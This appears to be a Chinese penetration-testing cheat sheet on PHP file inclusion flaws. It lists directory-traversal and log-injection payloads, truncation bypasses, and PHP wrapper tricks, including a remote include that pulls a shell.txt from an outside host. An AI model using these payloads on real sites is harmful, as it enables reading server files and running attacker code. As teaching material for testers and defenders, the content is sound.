文件包含
================================

基础
--------------------------------

常见的文件包含漏洞的形式为 ``<?php include("inc/" . $_GET['file']); ?>``

考虑常用的三种包含方式为

- 同目录包含 ``file=.htaccess``
- 目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``
- 日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``

其中日志可以使用SSH日志或者Web日志等多种日志来源测试

绕过技巧
--------------------------------
常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式

1. 截断

1.1 %00截断

    几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。

1.2 长度截断

    Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。

    msdn定义```#define MAX_PATH 260```，第260个字符为字符串结尾的```\0```

    linux可以用getconf来判断文件名长度限制和文件路径长度限制

    获取最长文件路径长度：getconf PATH_MAX /root 得到4096
    获取最长文件名：getconf NAME_MAX /root 得到255

    那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉

2. 伪协议绕过
    - RCE: requires allow_url_fopen=On and allow_url_include=On
    
    ::

        ?file=[http|https|ftp]://websec.wordpress.com/shell.txt

    - PHP INPUT: specify your payload in the POST parameters, watch urlencoding, details here, requires allow_url_include=On

    ::

        ?file=php://input

    
    - BASE64: lets you read PHP source because it wont get evaluated in base64. More details here and here

    ::

        ?file=php://filter/convert.base64-encode/resource=index.php

    
    - DATA: requires allow_url_include=On

    ::

        ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=


3. url绕过
4. 特殊字符绕过
